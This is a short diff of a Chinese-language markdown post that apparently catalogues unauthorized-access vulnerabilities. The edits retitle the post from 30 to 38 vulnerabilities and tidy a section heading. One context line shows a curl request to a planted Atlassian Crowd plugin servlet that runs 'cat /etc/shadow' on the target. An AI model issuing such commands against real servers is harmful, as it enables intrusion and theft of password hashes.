@@ -1,4 +1,4 @@
-# 常用的30种未授权访问漏洞汇总
+﻿# 常用的38种未授权访问漏洞汇总
 
 
 <!--more-->
@@ -1265,7 +1265,7 @@ curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
 
 可参考[https://www.cnblogs.com/cn-gov/p/13715861.html](https://www.cnblogs.com/cn-gov/p/13715861.html)
 
-## 【归纳补充】
+## 归纳补充
 
 **本人补充：批量检测漏洞思路（史上最经典）**
 
